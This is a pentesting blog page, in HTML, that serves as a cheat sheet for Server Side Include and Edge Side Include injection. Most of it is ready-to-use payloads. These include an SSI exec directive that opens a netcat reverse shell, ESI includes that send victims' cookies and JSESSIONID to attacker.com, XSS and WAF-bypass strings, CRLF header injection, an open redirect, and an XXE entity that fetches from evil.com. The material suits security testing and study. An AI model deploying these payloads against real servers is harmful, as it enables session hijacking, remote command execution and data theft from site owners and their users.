<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> erver Side Inclusion/Edge Side Inclusion Injectio | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-server-side-inclusion-edge-side-inclusion-injection/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">erver Side Inclusion/Edge Side Inclusion Injectio</h1> <p class="post-description"></p> </header> <article> <h1 id="server-side-inclusionedge-side-inclusion-injection">Server Side Inclusion/Edge Side Inclusion Injection</h1> <h2 id="server-side-inclusion-basic-information">Server Side Inclusion Basic Information</h2> <p><strong>(Introduction taken from</strong> <a href="https://httpd.apache.org/docs/current/howto/ssi.html" rel="external nofollow noopener" target="_blank"><strong>Apache docs</strong></a><strong>)</strong></p> <p>SSI (Server Side Includes) are directives that are <strong>placed in HTML pages, and evaluated on the server</strong> while the pages are being served. They let you <strong>add dynamically generated content</strong> to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.<br> For example, you might place a directive into an existing HTML page, such as:</p> <p><code class="language-plaintext highlighter-rouge">&lt;!--#echo var="DATE_LOCAL" --&gt;</code></p> <p>And, when the page is served, this fragment will be evaluated and replaced with its value:</p> <p><code class="language-plaintext highlighter-rouge">Tuesday, 15-Jan-2013 19:28:54 EST</code></p> <p>The decision of when to use SSI, and when to have your page entirely generated by some program, is usually a matter of how much of the page is static, and how much needs to be recalculated every time the page is served. SSI is a great way to add small pieces of information, such as the current time - shown above. But if a majority of your page is being generated at the time that it is served, you need to look for some other solution.</p> <p>You can infer the presence of SSI if the web application uses files with the extensions<strong><code class="language-plaintext highlighter-rouge">.shtml</code>, <code class="language-plaintext highlighter-rouge">.shtm</code> or <code class="language-plaintext highlighter-rouge">.stm</code></strong>, but it’s not only the case.</p> <p>A typical SSI expression has the following format:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!--#directive param="value" --&gt;
</code></pre></div></div> <h3 id="check">Check</h3> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Document name</span>
<span class="c">&lt;!--</span><span class="nx">#echo</span> <span class="kd">var</span><span class="o">=</span><span class="dl">"</span><span class="s2">DOCUMENT_NAME</span><span class="dl">"</span> <span class="o">--&gt;</span>
<span class="c1">// Date</span>
<span class="c">&lt;!--</span><span class="nx">#echo</span> <span class="kd">var</span><span class="o">=</span><span class="dl">"</span><span class="s2">DATE_LOCAL</span><span class="dl">"</span> <span class="o">--&gt;</span>

<span class="c1">// File inclusion</span>
<span class="c">&lt;!--</span><span class="nx">#include</span> <span class="nx">virtual</span><span class="o">=</span><span class="dl">"</span><span class="s2">/index.html</span><span class="dl">"</span> <span class="o">--&gt;</span>
<span class="c1">// Including files (same directory)</span>
<span class="c">&lt;!--</span><span class="nx">#include</span> <span class="nx">file</span><span class="o">=</span><span class="dl">"</span><span class="s2">file_to_include.html</span><span class="dl">"</span> <span class="o">--&gt;</span>
<span class="c1">// CGI Program results</span>
<span class="c">&lt;!--</span><span class="nx">#include</span> <span class="nx">virtual</span><span class="o">=</span><span class="dl">"</span><span class="s2">/cgi-bin/counter.pl</span><span class="dl">"</span> <span class="o">--&gt;</span>
<span class="c1">// Including virtual files (same directory)</span>
<span class="c">&lt;!--</span><span class="nx">#include</span> <span class="nx">virtual</span><span class="o">=</span><span class="dl">"</span><span class="s2">file_to_include.html</span><span class="dl">"</span> <span class="o">--&gt;</span>
<span class="c1">// Modification date of a file</span>
<span class="c">&lt;!--</span><span class="nx">#flastmod</span> <span class="nx">file</span><span class="o">=</span><span class="dl">"</span><span class="s2">index.html</span><span class="dl">"</span> <span class="o">--&gt;</span>

<span class="c1">// Command exec</span>
<span class="c">&lt;!--</span><span class="nx">#exec</span> <span class="nx">cmd</span><span class="o">=</span><span class="dl">"</span><span class="s2">dir</span><span class="dl">"</span> <span class="o">--&gt;</span>
<span class="c1">// Command exec</span>
<span class="c">&lt;!--</span><span class="nx">#exec</span> <span class="nx">cmd</span><span class="o">=</span><span class="dl">"</span><span class="s2">ls</span><span class="dl">"</span> <span class="o">--&gt;</span>
<span class="c1">// Reverse shell</span>
<span class="c">&lt;!--</span><span class="nx">#exec</span> <span class="nx">cmd</span><span class="o">=</span><span class="dl">"</span><span class="s2">mkfifo /tmp/foo;nc &lt;PENTESTER IP&gt; &lt;PORT&gt; 0&lt;/tmp/foo|/bin/bash 1&gt;/tmp/foo;rm /tmp/foo</span><span class="dl">"</span> <span class="o">--&gt;</span>

<span class="c1">// Print all variables</span>
<span class="c">&lt;!--</span><span class="nx">#printenv</span> <span class="o">--&gt;</span>
<span class="c1">// Setting variables</span>
<span class="c">&lt;!--</span><span class="nx">#set</span> <span class="kd">var</span><span class="o">=</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">Rich</span><span class="dl">"</span> <span class="o">--&gt;</span>

</code></pre></div></div> <h2 id="edge-side-inclusion">Edge Side Inclusion</h2> <p>There is a problem <strong>caching information or dynamic applications</strong> as part of the content may have <strong>varied</strong> for the next time the content is retrieved. This is what <strong>ESI</strong> is used form, to indicate using ESI tags the <strong>dynamic content that needs to be generated</strong> before sending the cache version.<br> If an <strong>attacker</strong> is able to <strong>inject an ESI tag</strong> inside the cache content, then, he could be able to i<strong>nject arbitrary content</strong> on the document before it’s sent to the users.</p> <h3 id="esi-detection">ESI Detection</h3> <p>The following <strong>header</strong> in a response from the server means that the server is using ESI:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Surrogate-Control: content="ESI/1.0"
</code></pre></div></div> <p>If you can’t find this header, the server <strong>might be using ESI anyways</strong>.<br> A <strong>blind exploitation approach can also be used</strong> as a request should arrive to the attackers server:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Basic detection</span>
<span class="nx">hell</span><span class="c">&lt;!--</span><span class="nx">esi</span><span class="o">--&gt;</span><span class="nx">o</span>
<span class="c1">// If previous is reflected as "hello", it's vulnerable</span>

<span class="c1">// Blind detection</span>
<span class="o">&lt;</span><span class="nx">esi</span><span class="p">:</span><span class="nx">include</span> <span class="nx">src</span><span class="o">=</span><span class="nx">http</span><span class="p">:</span><span class="c1">//attacker.com&gt;</span>

<span class="c1">// XSS Exploitation Example</span>
<span class="o">&lt;</span><span class="nx">esi</span><span class="p">:</span><span class="nx">include</span> <span class="nx">src</span><span class="o">=</span><span class="nx">http</span><span class="p">:</span><span class="c1">//attacker.com/XSSPAYLOAD.html&gt;</span>

<span class="c1">// Cookie Stealer (bypass httpOnly flag)</span>
<span class="o">&lt;</span><span class="nx">esi</span><span class="p">:</span><span class="nx">include</span> <span class="nx">src</span><span class="o">=</span><span class="nx">http</span><span class="p">:</span><span class="c1">//attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)&gt;</span>

<span class="c1">// Introduce private local files (Not LFI per se)</span>
<span class="o">&lt;</span><span class="nx">esi</span><span class="p">:</span><span class="nx">include</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">supersecret.txt</span><span class="dl">"</span><span class="o">&gt;</span>

<span class="c1">// Valid for Akamai, sends debug information in the response</span>
<span class="o">&lt;</span><span class="nx">esi</span><span class="p">:</span><span class="nx">debug</span><span class="o">/&gt;</span>
</code></pre></div></div> <h3 id="esi-exploitation">ESI exploitation</h3> <p><a href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/" rel="external nofollow noopener" target="_blank">GoSecure created</a> a table to understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported:</p> <ul> <li> <strong>Includes</strong>: Supports the <code class="language-plaintext highlighter-rouge">&lt;esi:includes&gt;</code> directive</li> <li> <strong>Vars</strong>: Supports the <code class="language-plaintext highlighter-rouge">&lt;esi:vars&gt;</code> directive. Useful for bypassing XSS Filters</li> <li> <strong>Cookie</strong>: Document cookies are accessible to the ESI engine</li> <li> <strong>Upstream Headers Required</strong>: Surrogate applications will not process ESI statements unless the upstream application provides the headers</li> <li> <strong>Host Allowlist</strong>: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts</li> </ul> <table> <thead> <tr> <th style="text-align: center"><strong>Software</strong></th> <th style="text-align: center"><strong>Includes</strong></th> <th style="text-align: center"><strong>Vars</strong></th> <th style="text-align: center"><strong>Cookies</strong></th> <th style="text-align: center"><strong>Upstream Headers Required</strong></th> <th style="text-align: center"><strong>Host Whitelist</strong></th> </tr> </thead> <tbody> <tr> <td style="text-align: center">Squid3</td> <td style="text-align: center">Yes</td> <td style="text-align: center">Yes</td> <td style="text-align: center">Yes</td> <td style="text-align: center">Yes</td> <td style="text-align: center">No</td> </tr> <tr> <td style="text-align: center">Varnish Cache</td> <td style="text-align: center">Yes</td> <td style="text-align: center">No</td> <td style="text-align: center">No</td> <td style="text-align: center">Yes</td> <td style="text-align: center">Yes</td> </tr> <tr> <td style="text-align: center">Fastly</td> <td style="text-align: center">Yes</td> <td style="text-align: center">No</td> <td style="text-align: center">No</td> <td style="text-align: center">No</td> <td style="text-align: center">Yes</td> </tr> <tr> <td style="text-align: center">Akamai ESI Test Server (ETS)</td> <td style="text-align: center">Yes</td> <td style="text-align: center">Yes</td> <td style="text-align: center">Yes</td> <td style="text-align: center">No</td> <td style="text-align: center">No</td> </tr> <tr> <td style="text-align: center">NodeJS esi</td> <td style="text-align: center">Yes</td> <td style="text-align: center">Yes</td> <td style="text-align: center">Yes</td> <td style="text-align: center">No</td> <td style="text-align: center">No</td> </tr> <tr> <td style="text-align: center">NodeJS nodesi</td> <td style="text-align: center">Yes</td> <td style="text-align: center">No</td> <td style="text-align: center">No</td> <td style="text-align: center">No</td> <td style="text-align: center">Optional</td> </tr> </tbody> </table> <h4 id="xss">XSS</h4> <p>The following ESI directive will load an arbitrary file inside the response of the server</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;esi:include</span> <span class="na">src=</span><span class="s">http://attacker.com/xss.html</span><span class="nt">&gt;</span>
</code></pre></div></div> <h4 id="bypass-client-xss-protection">Bypass client XSS protection</h4> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x=<span class="nt">&lt;esi:assign</span> <span class="na">name=</span><span class="s">"var1"</span> <span class="na">value=</span><span class="s">"'cript'"</span><span class="nt">/&gt;&lt;s</span><span class="err">&lt;esi:vars</span> <span class="na">name=</span><span class="s">"$(var1)"</span><span class="nt">/&gt;</span>&gt;alert(/Chrome%20XSS%20filter%20bypass/);<span class="err">&lt;</span>/s<span class="nt">&lt;esi:vars</span> <span class="na">name=</span><span class="s">"$(var1)"</span><span class="nt">/&gt;</span>&gt;

Use <span class="c">&lt;!--esi--&gt;</span> to bypass WAFs:
<span class="nt">&lt;scr</span><span class="err">&lt;!--esi--</span><span class="nt">&gt;</span>ipt&gt;aler<span class="c">&lt;!--esi--&gt;</span>t(1)<span class="err">&lt;</span>/sc<span class="c">&lt;!--esi--&gt;</span>ript&gt;
<span class="nt">&lt;img</span><span class="err">+</span><span class="na">src=</span><span class="s">x+on&lt;!--esi--</span><span class="nt">&gt;</span>error=ale<span class="c">&lt;!--esi--&gt;</span>rt(1)&gt;
</code></pre></div></div> <h4 id="steal-cookie">Steal Cookie</h4> <ul> <li>Remote steal cookie</li> </ul> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;esi:include</span> <span class="na">src=</span><span class="s">http://attacker.com/$(HTTP_COOKIE)</span><span class="nt">&gt;</span>
<span class="nt">&lt;esi:include</span> <span class="na">src=</span><span class="s">"http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})"</span> <span class="nt">/&gt;</span>
</code></pre></div></div> <ul> <li>Steal cookie HTTP_ONLY with XSS by reflecting it in the response:</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># This will reflect the cookies in the response</span>
&lt;<span class="o">!</span><span class="nt">--esi</span> <span class="si">$(</span>HTTP_COOKIE<span class="si">)</span> <span class="nt">--</span><span class="o">&gt;</span>
<span class="c"># Reflect XSS (you can put '"&gt;&lt;svg/onload=prompt(1)&gt;' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)</span>
&lt;<span class="o">!</span><span class="nt">--esi</span>/<span class="nv">$url_decode</span><span class="o">(</span><span class="s1">'"&gt;&lt;svg/onload=prompt(1)&gt;'</span><span class="o">)</span>/--&gt;

<span class="c"># It's possible to put more complex JS code to steal cookies or perform actions</span>
</code></pre></div></div> <h4 id="private-local-file">Private Local File</h4> <p>Do not confuse this with a “Local File Inclusion”:</p> <pre><code class="language-markup">&lt;esi:include src="secret.txt"&gt;
</code></pre> <h4 id="crlf">CRLF</h4> <pre><code class="language-markup">&lt;esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/&gt;
</code></pre> <h4 id="open-redirect">Open Redirect</h4> <p>The following will add a <code class="language-plaintext highlighter-rouge">Location</code> header to the response</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span><span class="nt">--esi</span> <span class="nv">$add_header</span><span class="o">(</span><span class="s1">'Location'</span>,<span class="s1">'http://attacker.com'</span><span class="o">)</span> <span class="nt">--</span><span class="o">&gt;</span>
</code></pre></div></div> <h4 id="add-header">Add Header</h4> <ul> <li>Add header in forced request</li> </ul> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;esi:include</span> <span class="na">src=</span><span class="s">"http://example.com/asdasd"</span><span class="nt">&gt;</span>
<span class="nt">&lt;esi:request_header</span> <span class="na">name=</span><span class="s">"User-Agent"</span> <span class="na">value=</span><span class="s">"12345"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/esi:include&gt;</span>
</code></pre></div></div> <ul> <li>Add header in response (useful to bypass “Content-Type: text/json” in a response with XSS)</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="o">!</span><span class="nt">--esi</span>/<span class="nv">$add_header</span><span class="o">(</span><span class="s1">'Content-Type'</span>,<span class="s1">'text/html'</span><span class="o">)</span>/--&gt;

&lt;<span class="o">!</span><span class="nt">--esi</span>/<span class="si">$(</span>HTTP_COOKIE<span class="si">)</span>/<span class="nv">$add_header</span><span class="o">(</span><span class="s1">'Content-Type'</span>,<span class="s1">'text/html'</span><span class="o">)</span>/<span class="nv">$url_decode</span><span class="o">(</span><span class="nv">$url_decode</span><span class="o">(</span><span class="s1">'"&gt;&lt;svg/onload=prompt(1)&gt;'</span><span class="o">))</span>/--&gt;

<span class="c"># Check the number of url_decode to know how many times you can URL encode the value</span>
</code></pre></div></div> <h4 id="crlf-in-add-header-cve-2019-2438">CRLF in Add header (<strong>CVE-2019-2438)</strong> </h4> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;esi:include</span> <span class="na">src=</span><span class="s">"http://example.com/asdasd"</span><span class="nt">&gt;</span>
<span class="nt">&lt;esi:request_header</span> <span class="na">name=</span><span class="s">"User-Agent"</span> <span class="na">value=</span><span class="s">"12345
Host: anotherhost.com"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/esi:include&gt;</span>
</code></pre></div></div> <h4 id="akamai-debug">Akamai debug</h4> <p>This will send debug information included in the response:</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;esi:debug/&gt;</span>
</code></pre></div></div> <h3 id="esi--xslt--xxe">ESI + XSLT = XXE</h3> <p>It’s possible to use <strong><code class="language-plaintext highlighter-rouge">eXtensible Stylesheet Language Transformations (XSLT)</code></strong> syntax in ESI just by indicating the param <strong><code class="language-plaintext highlighter-rouge">dca</code></strong> value as <strong><code class="language-plaintext highlighter-rouge">xslt</code></strong>. Which might allow to abuse <strong>XSLT</strong> to create and abuse a XML External Entity vulnerability (XXE):</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;esi:include</span> <span class="na">src=</span><span class="s">"http://host/poc.xml"</span> <span class="na">dca=</span><span class="s">"xslt"</span> <span class="na">stylesheet=</span><span class="s">"http://host/poc.xsl"</span> <span class="nt">/&gt;</span>
</code></pre></div></div> <p>XSLT file:</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
<span class="cp">&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM "http://evil.com/file" &gt;</span>]&gt;
<span class="nt">&lt;foo&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/foo&gt;</span>
</code></pre></div></div> <p>Check the XSLT page:</p> <p>xslt-server-side-injection-extensible-stylesheet-language-transformations.md</p> <h3 id="references">References</h3> <ul> <li><a href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/" rel="external nofollow noopener" target="_blank">https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/</a></li> <li><a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" rel="external nofollow noopener" target="_blank">https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/</a></li> <li><a href="https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91" rel="external nofollow noopener" target="_blank">https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91</a></li> </ul> <h2 id="brute-force-detection-list">Brute-Force Detection List</h2> <p>https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt</p> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>